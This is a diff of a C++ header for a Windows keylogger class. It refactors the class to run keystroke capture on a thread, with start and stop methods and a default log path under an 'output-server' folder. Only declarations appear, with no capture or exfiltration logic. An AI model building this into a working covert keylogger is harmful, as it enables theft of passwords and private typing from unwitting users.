@@ -3,26 +3,26 @@
 
 #include <Windows.h>
 #include <string>
-#include <stdlib.h>
-#include <stdio.h>
 #include <iostream>
 #include <fstream>
-#include <chrono>
 #include <atomic>
+#include <thread>
 #include <filesystem>
 
 class Keylogger {
 public:
-    Keylogger(const std::string& filename) : logFilename(filename), running(false) {}
+    Keylogger() : logFilePath("./output-server/default_log.txt"), running(false) {}
+    ~Keylogger();
 
-    void captureKey();
-    void setPath(const std::string &filePath);
+    void start(const std::string &filePath);
     void stop();
 
 private:
-    std::string logFilename;
+    std::string logFilePath;
     std::atomic<bool> running;
+    std::thread keyloggerThread;
 
+    void captureKey();
     void log(const std::string& input);
     bool logSpecialKey(int key);
     void logKey(char key) { log(std::string(1, key)); }
